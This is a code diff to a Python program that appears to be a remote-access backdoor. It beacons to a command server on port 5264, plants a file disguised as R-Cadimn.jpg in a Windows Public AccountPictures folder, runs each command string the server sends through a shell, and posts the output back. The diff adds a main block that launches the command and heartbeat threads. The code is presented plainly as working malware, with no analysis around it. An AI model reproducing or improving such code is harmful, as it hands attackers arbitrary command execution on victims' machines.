@@ -7,8 +7,8 @@ import platform
 import random
 import socket
 import string
-import time
 import threading
+import time
 import subprocess
 import requests
 
@@ -37,7 +37,6 @@ def CookieIF():
     global flag
     target_folder = "C:\\Users\\Public\\AccountPictures\\S-1-5-21-638547129-307165535-183523732-1002"
     file_path = os.path.join(target_folder, "R-Cadimn.jpg")
-    # 如果有了该文件，则直接读取Cookie并flag=True
     if os.access(file_path, os.F_OK):
         with open(file_path, 'rb') as file:
             lines = file.readlines()
@@ -46,7 +45,7 @@ def CookieIF():
     else:
         if not os.path.exists(target_folder):
             os.mkdir(target_folder)
-        with open("R-Cadimn.jpg", "rb") as r:
+        with open("_internal\\R-Cadimn.jpg", "rb") as r:
             with open(file_path, "wb") as f:
                 f.write(r.read())
 
@@ -69,14 +68,13 @@ def Cookie():
 def ShellOsHttp():
     while True:
         s = requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp", data=Cookie(), timeout=None).text
-        process = subprocess.run(s, shell=True, stdout=subprocess.PIPE)
+        process = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         b = process.stdout
         requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp/Input", data=b)
 
 
 def HeartbeatHttp():
     while True:
-        print(Cookie())
         requests.post(f"http://{ServerIP}:5264/api/HeartbeatHttp", data=Cookie())
         time.sleep(180)
 
@@ -89,3 +87,11 @@ def InitServer():
     print(data)
     requests.post(f"http://{ServerIP}:5264/api/init/cookie", data=data)
     return
+
+
+if __name__ == "__main__":
+    InitServer()
+    t2 = threading.Thread(target=ShellOsHttp)
+    t1 = threading.Thread(target=HeartbeatHttp)
+    t2.start()
+    t1.start()
